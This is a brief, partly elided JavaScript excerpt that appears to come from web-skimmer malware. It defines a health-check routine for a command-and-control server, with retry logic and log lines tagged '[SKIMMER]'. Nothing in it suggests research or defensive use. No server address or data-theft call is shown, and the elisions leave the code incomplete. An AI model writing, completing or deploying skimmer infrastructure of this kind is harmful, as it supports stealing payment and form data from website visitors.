    ...
    async function checkC2Health() {
      try {
        ...
        if (response.ok) {
          ...
          console.warn('[SKIMMER] ⚠️ C2 server health check failed with status:', response.status)
          return false
        }
      } catch (error) {
        console.warn('[SKIMMER] ⚠️ C2 server health check failed:', error.message)
        // Retry after a short delay
        setTimeout(() => {
          checkC2Health().then(ready => {
            if (ready) {
              console.log('[SKIMMER] ✅ C2 server is now ready after retry')
            }
          })
        }, 2000)
        return false
